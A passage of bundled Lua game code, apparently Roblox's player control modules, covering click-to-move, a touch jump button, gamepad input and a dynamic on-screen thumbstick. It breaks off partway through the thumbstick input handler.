					self:OnTouchEnded(input, processed)
				end
		
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					self.mouse2UpTime = tick()
					local currPos = input.Position
					-- We allow click to move during path following or if there is no keyboard movement
					local allowed = ExistingPather or self.keyboardMoveVector.Magnitude <= 0
					if self.mouse2UpTime - self.mouse2DownTime < 0.25 and (currPos - self.mouse2DownPos).magnitude < 5 and allowed then
						local positions = {currPos}
						OnTap(positions)
					end
				end
			end)
		
			self.tapConn = UserInputService.TouchTap:Connect(function(touchPositions, processed)
				if not processed then
					OnTap(touchPositions, nil, true)
				end
			end)
		
			self.menuOpenedConnection = GuiService.MenuOpened:Connect(function()
				CleanupPath()
			end)
		
			local function OnCharacterChildAdded(child)
				if UserInputService.TouchEnabled then
					if child:IsA('Tool') then
						child.ManualActivationOnly = true
					end
				end
				if child:IsA('Humanoid') then
					DisconnectEvent(self.humanoidDiedConn)
					self.humanoidDiedConn = child.Died:Connect(function()
						if ExistingIndicator then
							DebrisService:AddItem(ExistingIndicator.Model, 1)
						end
					end)
				end
			end
		
			self.characterChildAddedConn = character.ChildAdded:Connect(function(child)
				OnCharacterChildAdded(child)
			end)
			self.characterChildRemovedConn = character.ChildRemoved:Connect(function(child)
				if UserInputService.TouchEnabled then
					if child:IsA('Tool') then
						child.ManualActivationOnly = false
					end
				end
			end)
			for _, child in pairs(character:GetChildren()) do
				OnCharacterChildAdded(child)
			end
		end
		
		function ClickToMove:Start()
			self:Enable(true)
		end
		
		function ClickToMove:Stop()
			self:Enable(false)
		end
		
		function ClickToMove:CleanupPath()
			CleanupPath()
		end
		
		function ClickToMove:Enable(enable, enableWASD, touchJumpController)
			if enable then
				if not self.running then
					if Player.Character then -- retro-listen
						self:OnCharacterAdded(Player.Character)
					end
					self.onCharacterAddedConn = Player.CharacterAdded:Connect(function(char)
						self:OnCharacterAdded(char)
					end)
					self.running = true
				end
				self.touchJumpController = touchJumpController
				if self.touchJumpController then
					self.touchJumpController:Enable(self.jumpEnabled)
				end
			else
				if self.running then
					self:DisconnectEvents()
					CleanupPath()
					-- Restore tool activation on shutdown
					if UserInputService.TouchEnabled then
						local character = Player.Character
						if character then
							for _, child in pairs(character:GetChildren()) do
								if child:IsA('Tool') then
									child.ManualActivationOnly = false
								end
							end
						end
					end
					self.running = false
				end
				if self.touchJumpController and not self.jumpEnabled then
					self.touchJumpController:Enable(true)
				end
				self.touchJumpController = nil
			end
		
			-- Extension for initializing Keyboard input as this class now derives from Keyboard
			if UserInputService.KeyboardEnabled and enable ~= self.enabled then
		
				self.forwardValue  = 0
				self.backwardValue = 0
				self.leftValue = 0
				self.rightValue = 0
		
				self.moveVector = ZERO_VECTOR3
		
				if enable then
					self:BindContextActions()
					self:ConnectFocusEventListeners()
				else
					self:UnbindContextActions()
					self:DisconnectFocusEventListeners()
				end
			end
		
			self.wasdEnabled = enable and enableWASD or false
			self.enabled = enable
		end
		
		function ClickToMove:OnRenderStepped(dt)
			-- Reset jump
			self.isJumping = false
		
			-- Handle Pather
			if ExistingPather then
				-- Let the Pather update
				ExistingPather:OnRenderStepped(dt)
		
				-- If we still have a Pather, set the resulting actions
				if ExistingPather then
					-- Setup move (NOT relative to camera)
					self.moveVector = ExistingPather.NextActionMoveDirection
					self.moveVectorIsCameraRelative = false
		
					-- Setup jump (but do NOT prevent the base Keayboard class from requesting jumps as well)
					if ExistingPather.NextActionJump then
						self.isJumping = true
					end
				else
					self.moveVector = self.keyboardMoveVector
					self.moveVectorIsCameraRelative = true
				end
			else
				self.moveVector = self.keyboardMoveVector
				self.moveVectorIsCameraRelative = true
			end
		
			-- Handle Keyboard's jump
			if self.jumpRequested then
				self.isJumping = true
			end
		end
		
		-- Overrides Keyboard:UpdateMovement(inputState) to conditionally consider self.wasdEnabled and let OnRenderStepped handle the movement
		function ClickToMove:UpdateMovement(inputState)
			if inputState == Enum.UserInputState.Cancel then
				self.keyboardMoveVector = ZERO_VECTOR3
			elseif self.wasdEnabled then
				self.keyboardMoveVector = Vector3.new(self.leftValue + self.rightValue, 0, self.forwardValue + self.backwardValue)
			end
		end
		
		-- Overrides Keyboard:UpdateJump() because jump is handled in OnRenderStepped
		function ClickToMove:UpdateJump()
			-- Nothing to do (handled in OnRenderStepped)
		end
		
		--Public developer facing functions
		function ClickToMove:SetShowPath(value)
			ShowPath = value
		end
		
		function ClickToMove:GetShowPath()
			return ShowPath
		end
		
		function ClickToMove:SetWaypointTexture(texture)
			ClickToMoveDisplay.SetWaypointTexture(texture)
		end
		
		function ClickToMove:GetWaypointTexture()
			return ClickToMoveDisplay.GetWaypointTexture()
		end
		
		function ClickToMove:SetWaypointRadius(radius)
			ClickToMoveDisplay.SetWaypointRadius(radius)
		end
		
		function ClickToMove:GetWaypointRadius()
			return ClickToMoveDisplay.GetWaypointRadius()
		end
		
		function ClickToMove:SetEndWaypointTexture(texture)
			ClickToMoveDisplay.SetEndWaypointTexture(texture)
		end
		
		function ClickToMove:GetEndWaypointTexture()
			return ClickToMoveDisplay.GetEndWaypointTexture()
		end
		
		function ClickToMove:SetWaypointsAlwaysOnTop(alwaysOnTop)
			ClickToMoveDisplay.SetWaypointsAlwaysOnTop(alwaysOnTop)
		end
		
		function ClickToMove:GetWaypointsAlwaysOnTop()
			return ClickToMoveDisplay.GetWaypointsAlwaysOnTop()
		end
		
		function ClickToMove:SetFailureAnimationEnabled(enabled)
			PlayFailureAnimation = enabled
		end
		
		function ClickToMove:GetFailureAnimationEnabled()
			return PlayFailureAnimation
		end
		
		function ClickToMove:SetIgnoredPartsTag(tag)
			UpdateIgnoreTag(tag)
		end
		
		function ClickToMove:GetIgnoredPartsTag()
			return CurrentIgnoreTag
		end
		
		function ClickToMove:SetUseDirectPath(directPath)
			UseDirectPath = directPath
		end
		
		function ClickToMove:GetUseDirectPath()
			return UseDirectPath
		end
		
		function ClickToMove:SetAgentSizeIncreaseFactor(increaseFactorPercent)
			AgentSizeIncreaseFactor = 1.0 + (increaseFactorPercent / 100.0)
		end
		
		function ClickToMove:GetAgentSizeIncreaseFactor()
			return (AgentSizeIncreaseFactor - 1.0) * 100.0
		end
		
		function ClickToMove:SetUnreachableWaypointTimeout(timeoutInSec)
			UnreachableWaypointTimeout = timeoutInSec
		end
		
		function ClickToMove:GetUnreachableWaypointTimeout()
			return UnreachableWaypointTimeout
		end
		
		function ClickToMove:SetUserJumpEnabled(jumpEnabled)
			self.jumpEnabled = jumpEnabled
			if self.touchJumpController then
				self.touchJumpController:Enable(jumpEnabled)
			end
		end
		
		function ClickToMove:GetUserJumpEnabled()
			return self.jumpEnabled
		end
		
		function ClickToMove:MoveTo(position, showPath, useDirectPath)
			local character = Player.Character
			if character == nil then
				return false
			end
			local thisPather = Pather(position, Vector3.new(0, 1, 0), useDirectPath)
			if thisPather and thisPather:IsValidPath() then
				HandleMoveTo(thisPather, position, nil, character, showPath)
				return true
			end
			return false
		end
		
		return ClickToMove
		
	end[touch_jump] = function()
		--[[
			// FileName: TouchJump
			// Version 1.0
			// Written by: jmargh
			// Description: Implements jump controls for touch devices. Use with Thumbstick and Thumbpad
		--]]
		
		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")
		
		--[[ Constants ]]--
		local TOUCH_CONTROL_SHEET = "rbxasset://textures/ui/Input/TouchControlsSheetV2.png"
		
		--[[ The Module ]]--
		local BaseCharacterController = require(script.Parent:WaitForChild("BaseCharacterController"))
		local TouchJump = setmetatable({}, BaseCharacterController)
		TouchJump.__index = TouchJump
		
		function TouchJump.new()
			local self = setmetatable(BaseCharacterController.new(), TouchJump)
		
			self.parentUIFrame = nil
			self.jumpButton = nil
			self.characterAddedConn = nil
			self.humanoidStateEnabledChangedConn = nil
			self.humanoidJumpPowerConn = nil
			self.humanoidParentConn = nil
			self.externallyEnabled = false
			self.jumpPower = 0
			self.jumpStateEnabled = true
			self.isJumping = false
			self.humanoid = nil -- saved reference because property change connections are made using it
		
			return self
		end
		
		function TouchJump:EnableButton(enable)
			if enable then
				if not self.jumpButton then
					self:Create()
				end
				local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid and self.externallyEnabled then
					if self.externallyEnabled then
						if humanoid.JumpPower > 0 then
							self.jumpButton.Visible = true
						end
					end
				end
			else
				self.jumpButton.Visible = false
				self.isJumping = false
				self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
			end
		end
		
		function TouchJump:UpdateEnabled()
			if self.jumpPower > 0 and self.jumpStateEnabled then
				self:EnableButton(true)
			else
				self:EnableButton(false)
			end
		end
		
		function TouchJump:HumanoidChanged(prop)
			local humanoid = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				if prop == "JumpPower" then
					self.jumpPower =  humanoid.JumpPower
					self:UpdateEnabled()
				elseif prop == "Parent" then
					if not humanoid.Parent then
						self.humanoidChangeConn:Disconnect()
					end
				end
			end
		end
		
		function TouchJump:HumanoidStateEnabledChanged(state, isEnabled)
			if state == Enum.HumanoidStateType.Jumping then
				self.jumpStateEnabled = isEnabled
				self:UpdateEnabled()
			end
		end
		
		function TouchJump:CharacterAdded(char)
			if self.humanoidChangeConn then
				self.humanoidChangeConn:Disconnect()
				self.humanoidChangeConn = nil
			end
		
			self.humanoid = char:FindFirstChildOfClass("Humanoid")
			while not self.humanoid do
				char.ChildAdded:wait()
				self.humanoid = char:FindFirstChildOfClass("Humanoid")
			end
		
			self.humanoidJumpPowerConn = self.humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
				self.jumpPower =  self.humanoid.JumpPower
				self:UpdateEnabled()
			end)
		
			self.humanoidParentConn = self.humanoid:GetPropertyChangedSignal("Parent"):Connect(function()
				if not self.humanoid.Parent then
					self.humanoidJumpPowerConn:Disconnect()
					self.humanoidJumpPowerConn = nil
					self.humanoidParentConn:Disconnect()
					self.humanoidParentConn = nil
				end
			end)
		
			self.humanoidStateEnabledChangedConn = self.humanoid.StateEnabledChanged:Connect(function(state, enabled)
				self:HumanoidStateEnabledChanged(state, enabled)
			end)
		
			self.jumpPower = self.humanoid.JumpPower
			self.jumpStateEnabled = self.humanoid:GetStateEnabled(Enum.HumanoidStateType.Jumping)
			self:UpdateEnabled()
		end
		
		function TouchJump:SetupCharacterAddedFunction()
			self.characterAddedConn = Players.LocalPlayer.CharacterAdded:Connect(function(char)
				self:CharacterAdded(char)
			end)
			if Players.LocalPlayer.Character then
				self:CharacterAdded(Players.LocalPlayer.Character)
			end
		end
		
		function TouchJump:Enable(enable, parentFrame)
			if parentFrame then
				self.parentUIFrame = parentFrame
			end
			self.externallyEnabled = enable
			self:EnableButton(enable)
		end
		
		function TouchJump:Create()
			if not self.parentUIFrame then
				return
			end
		
			if self.jumpButton then
				self.jumpButton:Destroy()
				self.jumpButton = nil
			end
		
			local minAxis = math.min(self.parentUIFrame.AbsoluteSize.x, self.parentUIFrame.AbsoluteSize.y)
			local isSmallScreen = minAxis <= 500
			local jumpButtonSize = isSmallScreen and 70 or 120
		
			self.jumpButton = Instance.new("ImageButton")
			self.jumpButton.Name = "JumpButton"
			self.jumpButton.Visible = false
			self.jumpButton.BackgroundTransparency = 1
			self.jumpButton.Image = TOUCH_CONTROL_SHEET
			self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
			self.jumpButton.ImageRectSize = Vector2.new(144, 144)
			self.jumpButton.Size = UDim2.new(0, jumpButtonSize, 0, jumpButtonSize)
		
		    self.jumpButton.Position = isSmallScreen and UDim2.new(1, -(jumpButtonSize*1.5-10), 1, -jumpButtonSize - 20) or
		        UDim2.new(1, -(jumpButtonSize*1.5-10), 1, -jumpButtonSize * 1.75)
		
			local touchObject = nil
			self.jumpButton.InputBegan:connect(function(inputObject)
				--A touch that starts elsewhere on the screen will be sent to a frame's InputBegan event
				--if it moves over the frame. So we check that this is actually a new touch (inputObject.UserInputState ~= Enum.UserInputState.Begin)
				if touchObject or inputObject.UserInputType ~= Enum.UserInputType.Touch
					or inputObject.UserInputState ~= Enum.UserInputState.Begin then
					return
				end
		
				touchObject = inputObject
				self.jumpButton.ImageRectOffset = Vector2.new(146, 146)
				self.isJumping = true
			end)
		
			local OnInputEnded = function()
				touchObject = nil
				self.isJumping = false
				self.jumpButton.ImageRectOffset = Vector2.new(1, 146)
			end
		
			self.jumpButton.InputEnded:connect(function(inputObject)
				if inputObject == touchObject then
					OnInputEnded()
				end
			end)
		
			GuiService.MenuOpened:connect(function()
				if touchObject then
					OnInputEnded()
				end
			end)
		
			if not self.characterAddedConn then
				self:SetupCharacterAddedFunction()
			end
		
			self.jumpButton.Parent = self.parentUIFrame
		end
		
		return TouchJump
		
	end[gamepad] = function()
		--[[
			Gamepad Character Control - This module handles controlling your avatar using a game console-style controller
		
			2018 PlayerScripts Update - AllYourBlox
		--]]
		
		local UserInputService = game:GetService("UserInputService")
		local ContextActionService = game:GetService("ContextActionService")
		
		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local NONE = Enum.UserInputType.None
		local thumbstickDeadzone = 0.2
		
		--[[ The Module ]]--
		local BaseCharacterController = require(script.Parent:WaitForChild("BaseCharacterController"))
		local Gamepad = setmetatable({}, BaseCharacterController)
		Gamepad.__index = Gamepad
		
		function Gamepad.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(BaseCharacterController.new(), Gamepad)
		
			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
		
			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
		
			self.activeGamepad = NONE	-- Enum.UserInputType.Gamepad1, 2, 3...
			self.gamepadConnectedConn = nil
			self.gamepadDisconnectedConn = nil
			return self
		end
		
		function Gamepad:Enable(enable)
			if not UserInputService.GamepadEnabled then
				return false
			end
		
			if enable == self.enabled then
				-- Module is already in the state being requested. True is returned here since the module will be in the state
				-- expected by the code that follows the Enable() call. This makes more sense than returning false to indicate
				-- no action was necessary. False indicates failure to be in requested/expected state.
				return true
			end
		
			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
			self.moveVector = ZERO_VECTOR3
			self.isJumping = false
		
			if enable then
				self.activeGamepad = self:GetHighestPriorityGamepad()
				if self.activeGamepad ~= NONE then
					self:BindContextActions()
					self:ConnectGamepadConnectionListeners()
				else
					-- No connected gamepads, failure to enable
					return false
				end
			else
				self:UnbindContextActions()
				self:DisconnectGamepadConnectionListeners()
				self.activeGamepad = NONE
			end
		
			self.enabled = enable
			return true
		end
		
		-- This function selects the lowest number gamepad from the currently-connected gamepad
		-- and sets it as the active gamepad
		function Gamepad:GetHighestPriorityGamepad()
			local connectedGamepads = UserInputService:GetConnectedGamepads()
			local bestGamepad = NONE -- Note that this value is higher than all valid gamepad values
			for _, gamepad in pairs(connectedGamepads) do
				if gamepad.Value < bestGamepad.Value then
					bestGamepad = gamepad
				end
			end
			return bestGamepad
		end
		
		function Gamepad:BindContextActions()
		
			if self.activeGamepad == NONE then
				-- There must be an active gamepad to set up bindings
				return false
			end
		
			local handleJumpAction = function(actionName, inputState, inputObject)
				self.isJumping = (inputState == Enum.UserInputState.Begin)
				return Enum.ContextActionResult.Sink
			end
		
			local handleThumbstickInput = function(actionName, inputState, inputObject)
		
				if inputState == Enum.UserInputState.Cancel then
					self.moveVector = ZERO_VECTOR3
					return Enum.ContextActionResult.Sink
				end
		
				if self.activeGamepad ~= inputObject.UserInputType then
					return Enum.ContextActionResult.Pass
				end
				if inputObject.KeyCode ~= Enum.KeyCode.Thumbstick1 then return end
		
				if inputObject.Position.magnitude > thumbstickDeadzone then
					self.moveVector  =  Vector3.new(inputObject.Position.X, 0, -inputObject.Position.Y)
				else
					self.moveVector = ZERO_VECTOR3
				end
				return Enum.ContextActionResult.Sink
			end
		
			ContextActionService:BindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			ContextActionService:BindActionAtPriority("jumpAction", handleJumpAction, false,
				self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonA)
			ContextActionService:BindActionAtPriority("moveThumbstick", handleThumbstickInput, false,
				self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Thumbstick1)
		
			return true
		end
		
		function Gamepad:UnbindContextActions()
			if self.activeGamepad ~= NONE then
				ContextActionService:UnbindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			end
			ContextActionService:UnbindAction("moveThumbstick")
			ContextActionService:UnbindAction("jumpAction")
		end
		
		function Gamepad:OnNewGamepadConnected()
			-- A new gamepad has been connected.
			local bestGamepad = self:GetHighestPriorityGamepad()
		
			if bestGamepad == self.activeGamepad then
				-- A new gamepad was connected, but our active gamepad is not changing
				return
			end
		
			if bestGamepad == NONE then
				-- There should be an active gamepad when GamepadConnected fires, so this should not
				-- normally be hit. If there is no active gamepad, unbind actions but leave
				-- the module enabled and continue to listen for a new gamepad connection.
				warn("Gamepad:OnNewGamepadConnected found no connected gamepads")
				self:UnbindContextActions()
				return
			end
		
			if self.activeGamepad ~= NONE then
				-- Switching from one active gamepad to another
				self:UnbindContextActions()
			end
		
			self.activeGamepad = bestGamepad
			self:BindContextActions()
		end
		
		function Gamepad:OnCurrentGamepadDisconnected()
			if self.activeGamepad ~= NONE then
				ContextActionService:UnbindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			end
		
			local bestGamepad = self:GetHighestPriorityGamepad()
		
			if self.activeGamepad ~= NONE and bestGamepad == self.activeGamepad then
				warn("Gamepad:OnCurrentGamepadDisconnected found the supposedly disconnected gamepad in connectedGamepads.")
				self:UnbindContextActions()
				self.activeGamepad = NONE
				return
			end
		
			if bestGamepad == NONE then
				-- No active gamepad, unbinding actions but leaving gamepad connection listener active
				self:UnbindContextActions()
				self.activeGamepad = NONE
			else
				-- Set new gamepad as active and bind to tool activation
				self.activeGamepad = bestGamepad
				ContextActionService:BindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			end
		end
		
		function Gamepad:ConnectGamepadConnectionListeners()
			self.gamepadConnectedConn = UserInputService.GamepadConnected:Connect(function(gamepadEnum)
				self:OnNewGamepadConnected()
			end)
		
			self.gamepadDisconnectedConn = UserInputService.GamepadDisconnected:Connect(function(gamepadEnum)
				if self.activeGamepad == gamepadEnum then
					self:OnCurrentGamepadDisconnected()
				end
			end)
		
		end
		
		function Gamepad:DisconnectGamepadConnectionListeners()
			if self.gamepadConnectedConn then
				self.gamepadConnectedConn:Disconnect()
				self.gamepadConnectedConn = nil
			end
		
			if self.gamepadDisconnectedConn then
				self.gamepadDisconnectedConn:Disconnect()
				self.gamepadDisconnectedConn = nil
			end
		end
		
		return Gamepad
		
	end[dynamic_thumbstick] = function()
		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local TOUCH_CONTROLS_SHEET = "rbxasset://textures/ui/Input/TouchControlsSheetV2.png"
		
		local DYNAMIC_THUMBSTICK_ACTION_NAME = "DynamicThumbstickAction"
		local DYNAMIC_THUMBSTICK_ACTION_PRIORITY = Enum.ContextActionPriority.High.Value
		
		local MIDDLE_TRANSPARENCIES = {
			1 - 0.89,
			1 - 0.70,
			1 - 0.60,
			1 - 0.50,
			1 - 0.40,
			1 - 0.30,
			1 - 0.25
		}
		local NUM_MIDDLE_IMAGES = #MIDDLE_TRANSPARENCIES
		
		local FADE_IN_OUT_BACKGROUND = true
		local FADE_IN_OUT_MAX_ALPHA = 0.35
		
		local FADE_IN_OUT_HALF_DURATION_DEFAULT = 0.3
		local FADE_IN_OUT_BALANCE_DEFAULT = 0.5
		local ThumbstickFadeTweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
		
		local Players = game:GetService("Players")
		local GuiService = game:GetService("GuiService")
		local UserInputService = game:GetService("UserInputService")
		local ContextActionService = game:GetService("ContextActionService")
		local RunService = game:GetService("RunService")
		local TweenService = game:GetService("TweenService")
		
		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		--[[ The Module ]]--
		local BaseCharacterController = require(script.Parent:WaitForChild("BaseCharacterController"))
		local DynamicThumbstick = setmetatable({}, BaseCharacterController)
		DynamicThumbstick.__index = DynamicThumbstick
		
		function DynamicThumbstick.new()
			local self = setmetatable(BaseCharacterController.new(), DynamicThumbstick)
		
			self.moveTouchObject = nil
			self.moveTouchLockedIn = false
			self.moveTouchFirstChanged = false
			self.moveTouchStartPosition = nil
		
			self.startImage = nil
			self.endImage = nil
			self.middleImages = {}
		
			self.startImageFadeTween = nil
			self.endImageFadeTween = nil
			self.middleImageFadeTweens = {}
		
			self.isFirstTouch = true
		
			self.thumbstickFrame = nil
		
			self.onRenderSteppedConn = nil
		
			self.fadeInAndOutBalance = FADE_IN_OUT_BALANCE_DEFAULT
			self.fadeInAndOutHalfDuration = FADE_IN_OUT_HALF_DURATION_DEFAULT
			self.hasFadedBackgroundInPortrait = false
			self.hasFadedBackgroundInLandscape = false
		
			self.tweenInAlphaStart = nil
			self.tweenOutAlphaStart = nil
		
			return self
		end
		
		-- Note: Overrides base class GetIsJumping with get-and-clear behavior to do a single jump
		-- rather than sustained jumping. This is only to preserve the current behavior through the refactor.
		function DynamicThumbstick:GetIsJumping()
			local wasJumping = self.isJumping
			self.isJumping = false
			return wasJumping
		end
		
		function DynamicThumbstick:Enable(enable, uiParentFrame)
			if enable == nil then return false end			-- If nil, return false (invalid argument)
			enable = enable and true or false				-- Force anything non-nil to boolean before comparison
			if self.enabled == enable then return true end	-- If no state change, return true indicating already in requested state
		
			if enable then
				-- Enable
				if not self.thumbstickFrame then
					self:Create(uiParentFrame)
				end
		
				self:BindContextActions()
			else
				ContextActionService:UnbindAction(DYNAMIC_THUMBSTICK_ACTION_NAME)
				-- Disable
				self:OnInputEnded() -- Cleanup
			end
		
			self.enabled = enable
			self.thumbstickFrame.Visible = enable
		end
		
		-- Was called OnMoveTouchEnded in previous version
		function DynamicThumbstick:OnInputEnded()
			self.moveTouchObject = nil
			self.moveVector = ZERO_VECTOR3
			self:FadeThumbstick(false)
		end
		
		function DynamicThumbstick:FadeThumbstick(visible)
			if not visible and self.moveTouchObject then
				return
			end
			if self.isFirstTouch then return end
		
			if self.startImageFadeTween then
				self.startImageFadeTween:Cancel()
			end
			if self.endImageFadeTween then
				self.endImageFadeTween:Cancel()
			end
			for i = 1, #self.middleImages do
				if self.middleImageFadeTweens[i] then
					self.middleImageFadeTweens[i]:Cancel()
				end
			end
		
			if visible then
				self.startImageFadeTween = TweenService:Create(self.startImage, ThumbstickFadeTweenInfo, { ImageTransparency = 0 })
				self.startImageFadeTween:Play()
		
				self.endImageFadeTween = TweenService:Create(self.endImage, ThumbstickFadeTweenInfo, { ImageTransparency = 0.2 })
				self.endImageFadeTween:Play()
		
				for i = 1, #self.middleImages do
					self.middleImageFadeTweens[i] = TweenService:Create(self.middleImages[i], ThumbstickFadeTweenInfo, { ImageTransparency = MIDDLE_TRANSPARENCIES[i] })
					self.middleImageFadeTweens[i]:Play()
				end
			else
				self.startImageFadeTween = TweenService:Create(self.startImage, ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
				self.startImageFadeTween:Play()
		
				self.endImageFadeTween = TweenService:Create(self.endImage, ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
				self.endImageFadeTween:Play()
		
				for i = 1, #self.middleImages do
					self.middleImageFadeTweens[i] = TweenService:Create(self.middleImages[i], ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
					self.middleImageFadeTweens[i]:Play()
				end
			end
		end
		
		function DynamicThumbstick:FadeThumbstickFrame(fadeDuration, fadeRatio)
			self.fadeInAndOutHalfDuration = fadeDuration * 0.5
			self.fadeInAndOutBalance = fadeRatio
			self.tweenInAlphaStart = tick()
		end
		
		function DynamicThumbstick:InputInFrame(inputObject)
			local frameCornerTopLeft = self.thumbstickFrame.AbsolutePosition
			local frameCornerBottomRight = frameCornerTopLeft + self.thumbstickFrame.AbsoluteSize
			local inputPosition = inputObject.Position
			if inputPosition.X >= frameCornerTopLeft.X and inputPosition.Y >= frameCornerTopLeft.Y then
				if inputPosition.X <= frameCornerBottomRight.X and inputPosition.Y <= frameCornerBottomRight.Y then
					return true
				end
			end
			return false
		end
		
		function DynamicThumbstick:DoFadeInBackground()
			local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			local hasFadedBackgroundInOrientation = false
		
			-- only fade in/out the background once per orientation
			if playerGui then
				if playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeLeft or
					playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeRight then
						hasFadedBackgroundInOrientation = self.hasFadedBackgroundInLandscape
						self.hasFadedBackgroundInLandscape = true
				elseif playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.Portrait then
						hasFadedBackgroundInOrientation = self.hasFadedBackgroundInPortrait
						self.hasFadedBackgroundInPortrait = true
				end
			end
		
			if not hasFadedBackgroundInOrientation then
				self.fadeInAndOutHalfDuration = FADE_IN_OUT_HALF_DURATION_DEFAULT
				self.fadeInAndOutBalance = FADE_IN_OUT_BALANCE_DEFAULT
				self.tweenInAlphaStart = tick()
			end
		end
		
		function DynamicThumbstick:DoMove(direction)
			local currentMoveVector = direction
		
			-- Scaled Radial Dead Zone
			local inputAxisMagnitude = currentMoveVector.magnitude
			if inputAxisMagnitude < self.radiusOfDeadZone then
				currentMoveVector = ZERO_VECTOR3
			else
				currentMoveVector = currentMoveVector.unit*(
					1 - math.max(0, (self.radiusOfMaxSpeed - currentMoveVector.magnitude)/self.radiusOfMaxSpeed)
				)
				currentMoveVector = Vector3.new(currentMoveVector.x, 0, currentMoveVector.y)
			end
		
			self.moveVector = currentMoveVector
		end
		
		
		function DynamicThumbstick:LayoutMiddleImages(startPos, endPos)
			local startDist = (self.thumbstickSize / 2) + self.middleSize
			local vector = endPos - startPos
			local distAvailable = vector.magnitude - (self.thumbstickRingSize / 2) - self.middleSize
			local direction = vector.unit
		
			local distNeeded = self.middleSpacing * NUM_MIDDLE_IMAGES
			local spacing = self.middleSpacing
		
			if distNeeded < distAvailable then
				spacing = distAvailable / NUM_MIDDLE_IMAGES
			end
		
			for i = 1, NUM_MIDDLE_IMAGES do
				local image = self.middleImages[i]
				local distWithout = startDist + (spacing * (i - 2))
				local currentDist = startDist + (spacing * (i - 1))
		
				if distWithout < distAvailable then
					local pos = endPos - direction * currentDist
					local exposedFraction = math.clamp(1 - ((currentDist - distAvailable) / spacing), 0, 1)
		
					image.Visible = true
					image.Position = UDim2.new(0, pos.X, 0, pos.Y)
					image.Size = UDim2.new(0, self.middleSize * exposedFraction, 0, self.middleSize * exposedFraction)
				else
					image.Visible = false
				end
			end
		end
		
		function DynamicThumbstick:MoveStick(pos)
			local vector2StartPosition = Vector2.new(self.moveTouchStartPosition.X, self.moveTouchStartPosition.Y)
			local startPos = vector2StartPosition - self.thumbstickFrame.AbsolutePosition
			local endPos = Vector2.new(pos.X, pos.Y) - self.thumbstickFrame.AbsolutePosition
			self.endImage.Position = UDim2.new(0, endPos.X, 0, endPos.Y)
			self:LayoutMiddleImages(startPos, endPos)
		end
		
		function DynamicThumbstick:BindContextActions()
			local function inputBegan(inputObject)
				if self.moveTouchObject then
					return Enum.ContextActionResult.Pass
				end
		
				if not self:InputInFrame(inputObject) then
					return Enum.ContextActionResult.Pass
				end
		
				if self.isFirstTouch then
					self.isFirstTouch = false
					local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out,0,false,0)
					TweenService:Create(self.startImage, tweenInfo, {Size = UDim2.new(0, 0, 0, 0)}):Play()
					TweenService:Create(
						self.endImage,
						tweenInfo,
						{Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize), ImageColor3 = Color3.new(0,0,0)}
					):Play()
				end
		
				self.moveTouchLockedIn = false
				self.moveTouchObject = inputObject
				self.moveTouchStartPosition = inputObject.Position
				self.moveTouchFirstChanged = true
		
				if FADE_IN_OUT_BACKGROUND then
					self:DoFadeInBackground()
				end
		
				return Enum.ContextActionResult.Pass
			end
		
			local function inputChanged(inputObject)
				if inputObject == self.moveTouchObject then
					if self.moveTouchFirstChanged then
						self.moveTouchFirstChanged = false
		
						local startPosVec2 = Vector2.new(
							inputObject.Position.X - self.thumbstickFrame.AbsolutePosition.X,
							inputObject.Position.Y - self.thumbstickFrame.AbsolutePosition.Y
						)
						self.startImage.Visible = true
						self.startImage.Position = UDim2.new(0, startPosVec2.X, 0, startPosVec2.Y)
						self.endImage.Visible = true
						self.endImage.Position = self.startImage.Position
		
						self:FadeThumbstick(true)
						self:MoveStick(inputObject.Position)
					end
		
					self.moveTouchLockedIn = true
		
					local direction = Vector2.new(
						inputObject.Position.x - self.moveTouchStartPosition.x,
						inputObject.Position.y - self.moveTouchStartPosition.y
					)
					if math.abs(direction.x) > 0 or math.abs(direction.y) > 0 then
						self:DoMove(direction)
						self:MoveStick(inputObject.Position)
					end
					return Enum.ContextActionResult.Sink
				end
				return Enum.ContextActionResult.Pass
			end
		
			local function inputEnded(inputObject)
				if inputObject == self.moveTouchObject then
					self:OnInputEnded()
					if self.moveTouchLockedIn then
						return Enum.ContextActionResult.Sink
					end
				end
				return Enum.ContextActionResult.Pass
			end
		
			local function handleInput(actionName, inputState, inputObject)
				if inputState == Enum.UserInputState.Begin then
					return inputBegan(inputObject)
				elseif inputState == Enum.UserInputState.Change then
					return inputChanged(inputObject)
				elseif inputState == Enum.UserInputState.End then
					return inputEnded(inputObject)
				elseif inputState == Enum.UserInputState.Cancel then
					self:OnInputEnded()
				end
